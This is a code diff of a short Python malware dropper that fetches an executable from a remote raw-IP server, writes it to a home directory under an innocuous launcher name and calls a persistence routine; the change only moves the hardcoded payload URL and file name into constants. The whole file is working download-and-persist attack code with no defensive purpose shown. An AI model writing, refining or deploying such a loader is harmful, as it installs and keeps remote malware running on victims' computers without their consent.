@@ -1,6 +1,6 @@
 import os
 import requests
-from modules.constants import MY_HOME, STARTUP
+from modules.constants import MY_HOME, PAYLOAD_URL, PAYLOAD_NAME
 
 
 def persistence(home, file_name):
@@ -23,17 +23,13 @@ def persistence(home, file_name):
         pass
 
 
-file_name = "Launcher.exe"
-
-URL = "http://45.56.115.91:8000/main.exe"
-
-r = requests.get(URL, allow_redirects=True)
+r = requests.get(PAYLOAD_URL, allow_redirects=True)
 
 
 if os.path.exists(MY_HOME):
-    open(MY_HOME + file_name, "wb").write(r.content)
+    open(MY_HOME + PAYLOAD_NAME, "wb").write(r.content)
 else:
     os.makedirs(MY_HOME)
-    open(MY_HOME + file_name, "wb").write(r.content)
+    open(MY_HOME + PAYLOAD_NAME, "wb").write(r.content)
 
-persistence(MY_HOME, file_name)
+persistence(MY_HOME, PAYLOAD_NAME)
